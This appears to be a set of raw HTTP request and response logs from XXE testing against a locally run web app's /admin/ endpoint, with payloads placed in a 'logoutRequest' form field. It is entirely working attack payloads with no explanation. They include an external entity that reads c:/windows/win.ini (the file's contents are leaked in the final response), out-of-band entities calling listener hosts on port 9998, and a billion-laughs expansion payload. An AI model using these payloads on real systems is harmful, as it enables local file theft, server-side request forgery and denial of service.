```
POST /admin/ HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 196
Connection: close

logoutRequest=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20test%20SYSTEM%20%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26test%3B%3C%2Froot%3E

HTTP/1.1 200 OK
Date: Tue, 10 Feb 2026 17:06:22 GMT
Server: WSGIServer/0.2 CPython/3.10.11
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Content-Length: 46
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

Processed logoutRequest for root. Text Len: 85
```



```
POST /admin/ HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 191
Connection: close

logoutRequest=%3c%3fxml%20version%3d%221.0%22%3f%3e%3c!DOCTYPE%20root%20%5b%3c!ENTITY%20%25%20remote%20SYSTEM%20%22http%3a%2f%2f127.0.0.1%3a9998%2fxxe_hit%22%3e%25remote%3b%5d%3e%3croot%2f%3e

HTTP/1.1 200 OK
Date: Tue, 10 Feb 2026 17:15:01 GMT
Server: WSGIServer/0.2 CPython/3.10.11
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Content-Length: 45
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

Processed logoutRequest for root. Text Len: 0
```








```
POST /admin/ HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 194
Connection: close

logoutRequest=%3c%3fxml%20version%3d%221.0%22%3f%3e%3c!DOCTYPE%20root%20%5b%3c!ENTITY%20%25%20remote%20SYSTEM%20%22http%3a%2f%2f192.168.1.86%3a9998%2fxxe_hit%22%3e%25remote%3b%5d%3e%3croot%2f%3e

HTTP/1.1 200 OK
Date: Tue, 10 Feb 2026 17:15:30 GMT
Server: WSGIServer/0.2 CPython/3.10.11
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Content-Length: 45
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

Processed logoutRequest for root. Text Len: 0

```









```
POST /admin/ HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 794
Connection: close

logoutRequest=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20lolz%20%5B%3C%21ENTITY%20lol%20%22lol%22%3E%3C%21ENTITY%20lol1%20%22%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%22%3E%3C%21ENTITY%20lol2%20%22%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%22%3E%3C%21ENTITY%20lol3%20%22%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%22%3E%3C%21ENTITY%20lol4%20%22%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%22%3E%3C%21ENTITY%20lol5%20%22%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%22%3E%5D%3E%3Croot%3E%26lol5%3B%3C%2Froot%3E


HTTP/1.1 500 Internal Server Error
Date: Tue, 10 Feb 2026 17:31:50 GMT
Server: WSGIServer/0.2 CPython/3.10.11
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Content-Length: 89
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

Error: Maximum entity amplification factor exceeded, line 1, column 25 (<string>, line 1)
```















```
POST /admin/ HTTP/1.1
Host: 127.0.0.1:8000
Content-Type: application/x-www-form-urlencoded
Content-Length: 196
Connection: close

logoutRequest=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20test%20SYSTEM%20%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26test%3B%3C%2Froot%3E


HTTP/1.1 200 OK
Date: Tue, 10 Feb 2026 17:45:04 GMT
Server: WSGIServer/0.2 CPython/3.10.11
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Content-Length: 142
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

Processed logoutRequest for root. Text Len: 85. Content: ; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1

```












```
```

